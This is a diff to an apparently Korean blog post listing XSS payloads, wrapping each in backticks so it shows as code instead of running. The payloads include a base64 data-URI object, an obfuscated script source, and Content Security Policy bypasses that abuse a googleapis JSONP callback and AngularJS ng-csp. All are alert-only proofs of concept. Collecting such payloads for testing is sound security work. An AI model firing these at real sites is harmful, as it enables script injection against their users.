@@ -70,13 +70,13 @@ published: true
 @shhnjk
 
 
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`
 
 
 @akita_zen
 
 
-<script ?/src="data:+,\u0061lert%281%29">/</script>
+`<script ?/src="data:+,\u0061lert%281%29">/</script>`
 
 
 @404death
@@ -115,10 +115,10 @@ published: true
 *** angular js 등 front-end framework의 cdn을 이용한 csp bypass**
 
 
-<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26 ..
+`<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26 ..`
 
 
-ng-app"ng-csp ng-click=$event.view.alert(1337)><script src =//ajax.googleapis.com/ajax ...
+`ng-app"ng-csp ng-click=$event.view.alert(1337)><script src =//ajax.googleapis.com/ajax ...`
 
 
 etc...
